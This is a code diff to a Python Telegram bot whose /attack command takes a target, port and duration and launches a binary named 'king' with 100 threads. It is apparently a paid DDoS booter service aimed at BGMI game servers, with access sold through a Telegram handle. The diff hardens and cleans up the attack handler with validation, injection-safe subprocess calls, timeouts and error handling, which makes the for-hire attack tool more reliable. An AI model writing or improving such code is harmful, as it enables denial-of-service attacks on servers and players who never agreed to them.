@@ -298,38 +298,78 @@ COOLDOWN_TIME =0
 @bot.message_handler(commands=['attack'])
 def handle_attack(message):
     user_id = str(message.chat.id)
-    if user_id in allowed_user_ids:
-        # Check if the user is in admin_id (admins have no cooldown)
-        if user_id not in admin_id:
-            # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
-                response = "You Are On Cooldown ❌. Please Wait 0sec Before Running The /attack Command Again."
-                bot.reply_to(message, response)
+    
+    # 1. Authorization Check
+    if user_id not in allowed_user_ids:
+        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /attack command. DM TO BUY ACCESS:- @BadMundaXd")
+        bot.reply_to(message, response)
+        return
+
+    # 2. Cooldown Check (Skip for admins)
+    if user_id not in admin_id:
+        if user_id in bgmi_cooldown:
+            elapsed = (datetime.datetime.now() - bgmi_cooldown[user_id]).total_seconds()
+            if elapsed < COOLDOWN_SECONDS:
+                remaining = int(COOLDOWN_SECONDS - elapsed)
+                bot.reply_to(message, f"❌ You Are On Cooldown. Wait {remaining} seconds before running /attack again.")
                 return
-            # Update the last time the user ran the command
-            bgmi_cooldown[user_id] = datetime.datetime.now()
+        # Set new cooldown timestamp
+        bgmi_cooldown[user_id] = datetime.datetime.now()
+
+    # 3. Parse Command
+    command = message.text.split()
+    if len(command) == 4:
+        target = command[1]
+        try:
+            port = int(command[2])
+            duration = int(command[3])
+        except ValueError:
+            bot.reply_to(message, "❌ Error: Port and Time must be integers.")
+            return
+            
+        if duration > 1000:
+            bot.reply_to(message, "❌ Error: Time interval must be less than 1000.")
+            return
+
+        # 4. Logging
+        record_command_logs(user_id, '/attack', target, port, duration)
+        log_command(user_id, target, port, duration)
         
-        command = message.text.split()
-        if len(command) == 4:  # Updated to accept target, time, and port
-            target = command[1]
-            port = int(command[2])  # Convert time to integer
-            time = int(command[3])  # Convert port to integer
-            if time > 1000:
-                response = "Error: Time interval must be less than 1000."
+        # 5. Execute Safely
+        bot.reply_to(message, f"🚀 Attack started. Target: {target} Port: {port} Time: {duration}s")
+        
+        # Use absolute path or ensure the binary is in the same directory
+        king_binary = os.path.abspath("./king")
+        
+        if not os.path.exists(king_binary):
+            logger.error(f"Binary not found at {king_binary}")
+            bot.reply_to(message, "❌ Error: Attack binary 'king' not found on server.")
+            return
+
+        try:
+            # Passing args as a list prevents Command Injection. No shell=True!
+            # Note: Assuming 'king' takes target, port, time, threads
+            result = subprocess.run(
+                [king_binary, target, str(port), str(duration), "100"],
+                capture_output=True,
+                text=True,
+                timeout=15 # Prevent hanging if binary fails
+            )
+            
+            if result.returncode != 0:
+                logger.error(f"Attack failed: {result.stderr}")
+                bot.reply_to(message, f"⚠️ Attack finished with errors. Check server logs.")
             else:
-                record_command_logs(user_id, '/attack', target, port, time)
-                log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./king {target} {port} {time} 100"
-                subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
-        else:
-            response = "✅ Usage :- /attack <target> <port> <time>"  # Updated command syntax
+                bot.reply_to(message, f"✅ BGMI Attack Finished. Target: {target} Port: {port} Time: {duration}s")
+                
+        except subprocess.TimeoutExpired:
+            bot.reply_to(message, "✅ Attack running in background (Timeout reached).")
+        except Exception as e:
+            logger.error(f"Execution error: {e}")
+            bot.reply_to(message, f"❌ Execution error: {e}")
+
     else:
-        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /attack command.                                                                          DM TO BUY ACCESS:- @BadMundaXd")
-
-    bot.reply_to(message, response)
-
+        bot.reply_to(message, "✅ Usage :- /attack <target> <port> <time>")
 
 
 # Add /mylogs command to display logs recorded for bgmi and website commands
